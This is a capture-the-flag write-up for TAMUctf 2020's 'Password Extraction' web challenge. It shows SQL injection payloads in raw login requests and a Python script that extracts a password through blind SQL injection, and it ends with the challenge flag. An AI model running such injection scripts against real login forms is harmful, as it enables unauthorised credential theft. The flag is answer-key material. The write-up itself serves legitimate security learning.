<h1>TAMUctf 2020 â€“ PASSWORD_EXTRACTION</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 50</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>The owner of this website often reuses passwords. Can you find out the password they are using on this test server?</p>
  
  <p>http://passwordextraction.tamuctf.com</p>
  
  <p>You do not need to use brute force for this challenge.</p>
</blockquote>

<h2>Solution</h2>

<p>The website contains only a login form that is vulnerable to SQL injection.</p>

<p>```
POST /login.php HTTP/1.1
Host: passwordextraction.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: http://passwordextraction.tamuctf.com
Connection: close
Referer: http://passwordextraction.tamuctf.com/
Upgrade-Insecure-Requests: 1</p>

<p>username=foo&amp;password=foo%27%20OR%201%3D1%20AND%20username%20LIKE%20%27a%25</p>

<p>HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 21 Mar 2020 18:00:47 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 72
Connection: close
Vary: Accept-Encoding</p>

<p>You've successfully authorized, but that doesn't get you the password.
```</p>

<p>Modifying the SQL injection query you will discover that the password is the flag.</p>

<p>```
POST /login.php HTTP/1.1
Host: passwordextraction.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://passwordextraction.tamuctf.com
Connection: close
Referer: http://passwordextraction.tamuctf.com/
Upgrade-Insecure-Requests: 1</p>

<p>username=foo&amp;password=foo%27%20OR%201%3D1%20AND%20password%20LIKE%20%27gigem%7B%25</p>

<p>HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 21 Mar 2020 18:02:51 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 72
Connection: close
Vary: Accept-Encoding</p>

<p>You've successfully authorized, but that doesn't get you the password.
```</p>

<p>You can write a <a href="password-extraction-solver.py">Python script</a> to easily exfiltrate all password chars via blind SQL injection.</p>

<p>```python
import requests
import string
import time</p>

<p>url_form = "http://passwordextraction.tamuctf.com/login.php"
payload = "username=foo&amp;password=foo' OR 1=1 AND password LIKE '{}%"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded",
   "Origin": "http://passwordextraction.tamuctf.com",
   "Referer": "http://passwordextraction.tamuctf.com/"
}</p>

<p>found<em>chars = "gigem{"
while True:
    for new</em>char in string.printable.replace("%", "").replace("<em>", ""):
        attempt = found</em>chars + new_char
        print("[<em>] Attempt: '{}'.".format(attempt))
        data = payload.format(attempt)
        print("[</em>] Payload: {}.".format(data))</p>

<pre><code>    page = None
    response_ok = False
    while not response_ok:
        try:
            page = requests.post(url_form, data=data, headers=headers)
            response_ok = True
        except:
            print("[!] EXCEPTION!")
            time.sleep(1 * 60)

    if "successfully authorized" in page.text:
        found_chars += new_char
        print("[*] Found chars: '{}'".format(found_chars))
        break

if found_chars[-1] == "}":
    break
</code></pre>

<p>print("The FLAG is: {}".format(found_chars))
```</p>

<p>The flag is the following.</p>

<p><code>
gigem{h0peYouScr1ptedTh1s}
</code></p>
